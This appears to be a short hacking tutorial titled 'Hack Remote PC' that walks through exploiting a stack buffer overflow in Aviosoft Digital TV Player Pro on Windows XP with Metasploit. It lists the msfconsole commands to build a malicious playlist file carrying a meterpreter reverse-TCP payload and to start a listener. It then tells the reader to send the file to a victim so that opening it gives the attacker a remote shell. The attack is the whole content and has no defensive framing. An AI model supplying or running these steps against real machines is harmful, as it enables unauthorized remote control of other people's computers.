Hack Remote PC using Aviosoft Digital TV Player Professional 1.0 Stack Buffer Overflow

This module exploits a vulnerability found in Aviosoft Digital TV Player Pro version 1.x. An overflow occurs when the process copies the content of a playlist file on to the stack, which may result aribitrary code execution under the context of the user.
Aviosoft DTV Player 1.0.1.2
Windows XP SP 2
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/aviosoft_plf_buf
Msf exploit (aviosoft_plf_buf)>set payload windows/meterpreter/reverse_tcp
Msf exploit (aviosoft_plf_buf)>set lhost 192.168.1.2 (IP of Local Host)
Msf exploit (aviosoft_plf_buf)>exploit

After we successfully generate the malicious File, it will stored on your local computer
/root/.msf4/local/msf.plf

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.2
exploit 
Now send your msf.plf both files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer
